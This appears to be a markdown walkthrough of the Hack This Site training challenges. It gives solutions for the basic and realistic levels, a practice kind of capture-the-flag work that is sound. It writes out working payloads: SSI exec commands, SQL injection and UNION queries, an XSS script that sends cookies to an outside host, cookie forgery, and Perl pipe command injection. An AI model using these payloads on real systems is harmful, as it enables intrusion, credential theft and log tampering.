# [Hack This Site](https://www.hackthissite.org)

## Basic

1. (HTML) Password is written in source code
2. (-) Enter blank password
3. (HTML) Password file name is written in source code => go read it
4. (HTML) The email address can be edited in the source to mail the password to yourself
    * Save the file on desktop, edit the email and click
5. (Javascript) Same as 4 + the URL referrer is checked by the server
    * Use javascript or Firefox console to modify the value of the element on the fly
    * or Same as 4 + spoof referrer using Firefox extension (RefControl)
6. (Ascii) Simple encryption scheme where every character is shifted by 1,2,3,etc (see Vigenère cypher)
7. (Unix) Append ls at the end of the command input to get the name of the password file
8. (SSI) Notice how the file ends with .shtml, which allows the execution of shell commands
    * Don't forget to go up one level to get to the password file
    * <!--#exec cmd="ls .." -->
9. (SSI, DT) Directory access is limited, but you can still use the input box from level 8 to access the 9th mission specifically
    * <!--#exec cmd="ls ../../9" -->
10. (Cookies) Password is irrelevant, the login is verified via a cookie that can easily be edited using Javascript
11. (Apache) Login page is located at very common index.php. The trick is finding the directory structure, given away by Elton John songs
    * Access the .htaccess file in /e/... to get to a hidden file containing the password, literally

## Realistic

1. (HTML) The dropdown values can be edited client-side to absurdely high amount allowing the cheating of the poll
2. (SQL Inj.) Check source for login page, then perform a basic SQL injection, e.g. ' or '1'='1
3. (DT) Check the source to locate the old website. From there, find a way to save the old page in place of the hacked one.
    * No need for Unix commands here, simply let the (old site poem) file creation script do the job by pasting/submitting the source of _oldindex.html_ under the name `../index.html`
4. (SQL Inj.) Submitting an incorrect email provides the name of the customers table 'email'
    * Now, toying with the URL on the products page tells us that 4 fields are expected from the query
    * Eg `1 UNION ALL SELECT 1,1,1,1`
    * Using an UNION, we can elaborate a query returning 4 fields from table 'email'
    * E.g. `?category=1 UNION ALL SELECT email,email,email,email from email` (or `?category=1 UNION ALL SELECT *,*,*,* from email` since that table  appears to only hold a single _email_ field)
    * Now just go the HTS Message Center on the homepage of HTS and post the list to SaveTheWhales
5. (Robots.txt, Hash crack) Exploring the file system, there are multiple things to notice:
    * There are a couple of hints that a robots.txt file is present to fend off search engines crawlers
    * Accessing that file shows the presence of the two directories "lib" and "secret" (also given away in the Database page source)
    * Then it is just a matter of retrieving the hash, (optional: identifying its type) and cracking it e.g. using online tools
6. (Crypto) XECryption decryption algorithm is as follows: add numbers together 3 by 3, perform frequency analysis to get the code of 'space' character
    * Subtract 32 (Ascii code for 'space' character) to the code and get the key
    * Subtracting the key from each number in the list gives the Ascii code of each character in the message => display char() of each numbe
7. (Apache, DT, Cracking) Browsing the source of the main page reveals the presence of the images/ directory and the showimages.php page that contains a vulnerability
    * Within the images/ direct lies another directory: admin/. Upon accessing it, we can realize it is protected using a Apache configuration .htpasswd file
    * Although we won't be able to access it directly, knowing it exists allows us to try and reach its content via a GET parameter to the showimages.php page
    * Once we get the content of the .htpasswd file, we can just pass it directly to a cracking program such as JohnTheRipper that will reveal the login/password
8. (SQL Inj, Cookie, Javascript) In order to find the login name of GaryHunter we can perform an SQL injection on the search.php page to return all the users.
    * Once we have the login name, we can create an account and login, then edit the cookie to switch the login name: document.cookie="accountUsername=GaryWilliamHunter";
    * The last part requires to change the "Clear personal files" button HTML value to "logFiles" in order to clear the system (and not personal) log files.
9. (XSS, DT, Cookie)  We need to use a XSS vulnerability in the website messaging system to retrieve the login cookie of the boss, however it's beyond the scope of the exercise to actually implement the cookie stealer PHP script
    * In order to do so, we can login using <r-conner@crappysoft.com> credentials and send a message to the boss using the following client-side scrit injection
    * `<script>window.location = "http://my.website.com/cookiesteal.php?c="+document.cookie</script>` => Get the cookie data and replace own cookie with it
    * document.cookie="strUsername=m-crap%40crappysoft.com;"
    * document.cookie="strPassword=94a35a3b7befff5eb2a8415af04aa16c";
    * document.cookie="intID=1";
    * In order to clear the logs, the mailing list page informs use that it contains a script that automatically deletes all the lines from the file exempt of '@'
    * Note how the file to update is specified in the HTML, thus we can edit it with the path to the logs file, which can be found in the directory hierarchy
10. (Soc. Eng., User Agent, Cookie) In this exercise, the credentials given by the student are never used. Instead, the listing of teachers displays their email, which is composed of their username.
    * By trying out every username on the teacher login page, we find out that one uses her username as password (smill/smiller)
    * Once we have successfully logged on, we are warned that the browser should be a specific one. Circumventing this restriction is done with a user-agent switcher.
    * Now, we need to edit the cookie to gain administrative powers and access the student grades.
    * A final step consists in getting the update URL for each low grades in the source code and simply pasting it in the address bar to run the update script.
11. (Perl) Notice that the way the pages are served is via a Perl script. By using an unexisting page name, it mentions the open() Perl method
    * This method is susceptible to a hack when providing a pipe '|' along with a command in the filename, the command will be executed (via process forking).
    * So we must try to reach this configuration: open(myfile, "ls -l|"); that will make the result of "ls -l" the content of the file displayed by the script.
    * However, we have to work within the restriction of the syntax open(file, "pages/[GET param]");
    * Use a first pipe '|' to pass the page parameter along to ls (effectively disregarding it) and a second one to direct the output of ls to us => page.pl?page=|ls|
    * This provides us with the files in the current directory. Two items are noteworthy: client_http_docs/ and bs.dbase.
    * The directory client_http_docs/ directory contains the hosted website. Looking around, one of the website might allow us into the root DB.
    * On the Radio website, there is script that logs browser visits as logging.html. Here we are supposed to switch user-agent to gain access to an account.
    * However just using account nr 0, we can edit the password and log as a mod (aclu_bomber_08290/change password). This gives us access to a SQLLite command line.
    * It is easy to Google the query listing all tables: SELECT name FROM sqlite_master WHERE type='table';
    * But we don't really want to run this on the Radio website database since it's local. We can actually branch the query script onto the main DB.
    * Changing the target DB in the HTML (and going up 2 ../ levels + 1 ../ more because of the db/ prefix in the script), we access the main DB.
    * SELECT * from web_hosting provides us with the customer accounts, that we can use to log in the admin page (access found under the FAQ section)
    * Once we're logged, we notice that we can't access space46 website directly, but we can browse and download any other resource from the other hoster websites.
    * When we try to download a file, it is served via a d.pl script. Downloading an image will direct to d.pl?file=path/imagefile.jpg. Let us change this to space46/src.tar.gz.
